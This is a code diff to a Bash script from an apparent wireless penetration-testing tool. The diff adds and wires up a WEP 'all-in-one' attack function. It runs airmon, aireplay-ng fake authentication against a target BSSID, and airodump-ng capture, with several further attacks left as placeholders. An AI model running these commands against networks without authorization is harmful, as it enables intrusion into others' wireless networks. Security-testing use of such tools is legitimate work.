@@ -1548,6 +1548,51 @@ function validate_network_encryption_type() {
 	return 0
 }
 
+#Execute wep all-in-one attack
+function exec_wep_allinone_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 296 "yellow"
+	language_strings "${language}" 115 "read"
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}wepdata" > /dev/null 2>&1
+
+	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)
+	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+
+	wep_processes=()
+
+	#TODO almost all attacks pending
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 30 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Custom Packet Replying" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Injection" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg brown -geometry "${g5_left4}" -T "Chop-Chop Attack" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg blue -geometry "${g5_left5}" -T "Fragmentation Attack" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg pink -geometry "${g5_left6}" -T "Caffe Latte Attack" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg grey -geometry "${g5_left7}" -T "Hirte Attack" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} -w \"${tmpdir}wepdata\" ${interface}" > /dev/null 2>&1 &
+	wep_processes+=($!)
+	xterm -hold -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "sleep 100" > /dev/null 2>&1 &
+	wep_processes+=($!)
+
+	echo
+	language_strings "${language}" 428 "yellow"
+	language_strings "${language}" 115 "read"
+
+	kill_wep_windows
+}
+
 #Execute wps custom pin bully attack
 function exec_wps_custom_pin_bully_attack() {
 
@@ -1914,7 +1959,7 @@ function michael_shutdown_option() {
 	exec_michaelshutdown
 }
 
-#Validate WEP All-in-One attack parameters
+#Validate wep all-in-one attack parameters
 function wep_option() {
 
 	debug_print
@@ -1940,11 +1985,11 @@ function wep_option() {
 		return 1
 	fi
 
+	echo
 	language_strings "${language}" 425 "yellow"
 	language_strings "${language}" 115 "read"
 
-	#TODO add WEP All-in-One attack execution
-	#exec_wep_allinone_attack
+	exec_wep_allinone_attack
 }
 
 #Validate wps parameters for custom pin, pixie dust, bruteforce and pin database attacks
@@ -2319,6 +2364,7 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}wepdata" > /dev/null 2>&1
 }
 
 #Manage cleaning firewall rules and restore orginal routing state
@@ -5591,6 +5637,16 @@ function kill_et_windows() {
 		kill "${item}" &> /dev/null
 	done
 	kill ${et_process_control_window} &> /dev/null
+}
+
+#Kill the wep attack processes
+function kill_wep_windows() {
+
+	debug_print
+
+	for item in "${wep_processes[@]}"; do
+		kill "${item}" &> /dev/null
+	done
 }
 
 #Convert capture file to hashcat format
